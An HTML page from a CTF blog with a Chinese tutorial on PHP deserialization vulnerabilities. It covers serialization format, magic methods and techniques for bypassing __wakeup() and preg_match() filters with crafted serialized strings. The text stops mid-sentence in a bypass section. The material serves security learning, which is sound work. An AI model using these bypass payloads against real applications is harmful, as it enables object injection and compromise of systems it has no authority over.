<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>反序列化 | Lazzaro</title><meta name="description" content="概念：序列化就是使用serialize()将对象的用字符串的方式进行表示，反序列化是使用unserialize()将序列化的字符串，构造成相应的对象，反序列化是序列化的逆过程。 序列化的对象可以是class也可以是Array,string等其他对象。 问题原因：漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码或变量用户可控，就可能产生反序"><meta property="og:type" content="article"><meta property="og:title" content="反序列化"><meta property="og:url" content="https://lazzzaro.github.io/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="概念：序列化就是使用serialize()将对象的用字符串的方式进行表示，反序列化是使用unserialize()将序列化的字符串，构造成相应的对象，反序列化是序列化的逆过程。 序列化的对象可以是class也可以是Array,string等其他对象。 问题原因：漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码或变量用户可控，就可能产生反序"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lazzzaro.github.io/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20191112223227-402c9c0c-0559-1.png"><meta property="article:published_time" content="2020-05-14T17:10:23.000Z"><meta property="article:modified_time" content="2024-09-18T10:00:23.860Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="python"><meta property="article:tag" content="PHP"><meta property="article:tag" content="Java"><meta property="article:tag" content="反序列化"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lazzzaro.github.io/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20191112223227-402c9c0c-0559-1.png"><link rel="canonical" href="https://lazzzaro.github.io/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="https://cdn.jsdelivr.net/npm/katex@0.9.0/dist/katex.min.css" rel="stylesheet"><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3Ft5J9t2Jl0eb5Zr",ck:"3Ft5J9t2Jl0eb5Zr",hashMode:!0})</script><meta name="generator" content="Hexo 7.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF弱鸡自进阶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">总览</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">汇总</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">类别</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">关键词</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">来留个言 👉👉👉</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">类别</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">49</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">17</span></li></ul></div></div><div class="widget"><h3 class="widget-title">关键词云</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020赛</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.86px">2021赛</a> <a href="/tags/2022%E8%B5%9B/" style="font-size:13.57px">2022赛</a> <a href="/tags/2023%E8%B5%9B/" style="font-size:13.71px">2023赛</a> <a href="/tags/2024%E8%B5%9B/" style="font-size:13.29px">2024赛</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13.14px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.29px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.14px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/XXE/" style="font-size:13px">XXE</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/hash/" style="font-size:13px">hash</a> <a href="/tags/js/" style="font-size:13px">js</a> <a href="/tags/node-js/" style="font-size:13.14px">node.js</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.43px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">内网</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">反序列化</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">反编译</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">反调试</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">取证</a> <a href="/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/" style="font-size:13px">后量子密码</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">命令行</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">图像</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">块密码</a> <a href="/tags/%E5%A0%86/" style="font-size:13px">堆</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.14px">密码</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">提权</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">文件上传</a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">曲线</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">栈</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">格密码</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">格式化字符串</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">注入</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">流密码</a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">流量</a> <a href="/tags/%E6%B7%B7%E6%B7%86/" style="font-size:13px">混淆</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">渗透</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">离散对数</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.14px">算法</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.43px">绕过</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">编码</a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.14px">脚本</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">自动化</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">逃逸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.29px">隐写</a></div></div><div class="widget"><h3 class="widget-title">汇总</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">十二月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">十一月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">三月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">九月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">二月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">九月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">序列化格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.</span> <span class="toc-text">三种访问控制的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#wakeup-%E5%A4%B1%E6%95%88"><span class="toc-number">4.0.1.</span> <span class="toc-text">__wakeup()失效</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87preg-match-%E5%8C%B9%E9%85%8D%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">4.0.2.</span> <span class="toc-text">绕过preg_match() 匹配的关键字</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-throw-new-Exception"><span class="toc-number">4.0.3.</span> <span class="toc-text">绕过 throw new Exception</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-md5-sha1-%E9%AA%8C%E8%AF%81"><span class="toc-number">4.0.4.</span> <span class="toc-text">绕过 md5+sha1 验证</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#unserialize-callback-func-spl-autoload"><span class="toc-number">4.0.5.</span> <span class="toc-text">unserialize_callback_func + spl_autoload</span></a></li></ol></li></ol><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">5.</span> <span class="toc-text">反序列化字符逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.</span> <span class="toc-text">phar反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">7.</span> <span class="toc-text">PHP session反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Soap%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">8.</span> <span class="toc-text">Soap反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">9.</span> <span class="toc-text">python反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">10.</span> <span class="toc-text">Java反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">11.</span> <span class="toc-text">JDBC反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88CVE%EF%BC%89"><span class="toc-number">12.</span> <span class="toc-text">框架反序列化（CVE）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Yii2"><span class="toc-number">12.0.1.</span> <span class="toc-text">Yii2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Laravel"><span class="toc-number">12.0.2.</span> <span class="toc-text">Laravel</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ThinkPHP"><span class="toc-number">12.0.3.</span> <span class="toc-text">ThinkPHP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHPGGC"><span class="toc-number">13.</span> <span class="toc-text">PHPGGC</span></a></li></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-web-反序列化" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">反序列化</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date"><time datetime="2020-05-14T17:10:23.000Z" itemprop="datePublished">2020-05-15</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/web/">web</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/Java/" rel="tag">Java</a>, <a class="article-tag-link-link" href="/tags/PHP/" rel="tag">PHP</a>, <a class="article-tag-link-link" href="/tags/python/" rel="tag">python</a>, <a class="article-tag-link-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="leancloud_visitors" data-flag-title="反序列化"><span class="leancloud-visitors-count">∞</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#comments" class="article-comment-link">评论</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>概念：序列化就是使用<strong>serialize()</strong>将对象的用字符串的方式进行表示，反序列化是使用<strong>unserialize()</strong>将序列化的字符串，构造成相应的对象，反序列化是序列化的逆过程。 序列化的对象可以是<strong>class</strong>也可以是<strong>Array,string</strong>等其他对象。</p><p>问题原因：漏洞的根源在于<strong>unserialize()</strong>函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码或变量用户可控，就可能产生反序列化漏洞，根据反序列化后不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。</p><p>​</p><h3 id="序列化格式"><a href="#序列化格式" class="headerlink" title="序列化格式"></a>序列化格式</h3><p>对象类型:对象名长度:”对象名”:对象成员变量个数:{变量1类型:变量名1长度:变量名1; 参数1类型:参数1长度:参数1; 变量2类型:变量名2长度:”变量名2”; 参数2类型:参数2长度:参数2;… …}</p><p>如：</p><p>O:6:”Person”:2:{s:12:” Person name”;s:8:”Thinking”;s:11:” Person sex”;s:3:”man”;} a:2:{s:4:”name”;s:8:”Thinking”;s:3:”sex”;s:3:”man”;}</p><p><strong>对象类型：</strong>Class-O，Array-a。</p><p><strong>变量和参数类型：</strong>string-s，int-i，Array-a，指针引用-R。</p><p><strong>序列符号：</strong>参数与变量之间用分号(;)隔开，同一变量和同一参数之间的数据用冒号(:)隔开。</p><blockquote><p>对于指针引用：</p><p>在序列化中，第一个对象是类，第二个对象才是类里的对象。</p></blockquote><div class="table-container"><table><thead><tr><th style="text-align:center">类型</th><th style="text-align:center">结构</th></tr></thead><tbody><tr><td style="text-align:center">字符串</td><td style="text-align:center">s:size:value;</td></tr><tr><td style="text-align:center">整数</td><td style="text-align:center">i:value;</td></tr><tr><td style="text-align:center">布尔值</td><td style="text-align:center">b:value;(保存1或0)</td></tr><tr><td style="text-align:center">空值</td><td style="text-align:center">N;</td></tr><tr><td style="text-align:center">数组</td><td style="text-align:center">a:size:{key definition;value definition;(repeated per element)}</td></tr><tr><td style="text-align:center">对象</td><td style="text-align:center">O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</td></tr><tr><td style="text-align:center">指针引用</td><td style="text-align:center">R:2;</td></tr></tbody></table></div><p>​</p><h3 id="三种访问控制的区别"><a href="#三种访问控制的区别" class="headerlink" title="三种访问控制的区别"></a>三种访问控制的区别</h3><p>public: <strong>变量名</strong></p><p>protected: <strong>\x00 + * + \x00 + 变量名</strong>（或 <strong>\00 + * + \00 + 变量名</strong> 或 <strong>%00 + * + %00 + 变量名</strong>）</p><p>private: <strong>\x00 + 类名 + \x00 + 变量名</strong>（或 <strong>\00 + 类名 + \00 + 变量名</strong> 或 <strong>%00 + 类名 + %00 + 变量名</strong>）</p><p>注：&gt;=php v7.2 反序列化对访问类别不敏感（protected -&gt; public）</p><p>​</p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()  <span class="comment">#每次创建新对象时先调用此方法</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()  <span class="comment">#某个对象的所有引用都被删除或者销毁时调用（没有变量指到当前对象时也会被触发，如 a:2:&#123;i:0;O:4:&quot;User&quot;:0:&#123;&#125;i:0;s:3:&quot;xxx&quot;;&#125;，被覆盖后没有变量指向User对象）</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()  <span class="comment">#把类被当做一个字符串使用时调用</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()  <span class="comment">#使用unserialize函数，反序列化恢复对象之前时调用</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()  <span class="comment">#使用serialize()函数，序列化对象之前时调用</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>()  <span class="comment">#在对象中，调用不存在的方法或调用权限不足时调用</span></span><br><span class="line"><span class="title function_ invoke__">__callstatic</span>()    <span class="comment">#在静态上下文中，调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>()  <span class="comment">#访问不存在的成员变量时调用</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>()   <span class="comment">#设置不存在的成员变量时调用</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()  <span class="comment">#当尝试以调用函数的方式调用一个对象时触发</span></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()  <span class="comment">#尝试加载未定义的类</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>()   <span class="comment">#在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()   <span class="comment">#在不可访问的属性上使用unset()时触发</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h5 id="wakeup-失效"><a href="#wakeup-失效" class="headerlink" title="__wakeup()失效"></a>__wakeup()失效</h5><ol><li><p>PHP5&lt;5.6.25 或 PHP7&lt;7.0.10</p><p>当序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行。</p><p>如：<code>O:4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125;</code></p></li><li><p>PHP7.3</p><p><code>Serialize</code> 特性：<code>O</code> 改为 <code>C</code>（需要利用内置了<code>Serializable</code>接口的类）</p><p><a target="_blank" rel="noopener" href="https://wiki.php.net/rfc/custom_object_serialization">PHP RFC: New custom object serialization mechanism</a></p><p><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=81151">bypass __wakeup</a></p><p>内置类 ArrayObject：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;b&quot;</span>=&gt;<span class="number">2</span>);</span><br><span class="line"><span class="variable">$ao</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ao</span>);</span><br><span class="line"><span class="comment">//C:11:&quot;ArrayObject&quot;:45:&#123;x:i:0;a:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;;m:a:0:&#123;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>其他类：</p><p>ArrayIterator / RecursiveArrayIterator / SplObjectStorage</p><p>参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">ctfshow 愚人杯 - easy_php</a></p></li></ol><h5 id="绕过preg-match-匹配的关键字"><a href="#绕过preg-match-匹配的关键字" class="headerlink" title="绕过preg_match() 匹配的关键字"></a>绕过preg_match() 匹配的关键字</h5><ul><li><p><strong>PHP低版本</strong></p><p>可使用<code>+</code>，<code>&lt;</code>绕过正则，如：</p><p><code>O:+4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125;</code></p><p><code>O:&lt;4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125;</code></p></li><li><p><strong>普通字符串</strong></p><p>PHP序列化中存在序列化类型 <code>S</code>，相较于小写的 <code>s</code>，大写 <code>S</code> 是escaped字符串，会将 <code>\xx</code> 形式作为一个16进制字符处理，如：<code>n</code> 的十六进制是 <code>6e</code>，所以把 <code>name</code>替换为 <code>\6eame</code> 即可绕过。</p></li><li><p><strong><code>/^O:\d+/</code></strong></p><p><code>serialize(array($data))</code></p></li></ul><h5 id="绕过-throw-new-Exception"><a href="#绕过-throw-new-Exception" class="headerlink" title="绕过 throw new Exception"></a>绕过 throw new Exception</h5><ul><li><p>去掉最后的大括号，利用反序列化报错来防止进入 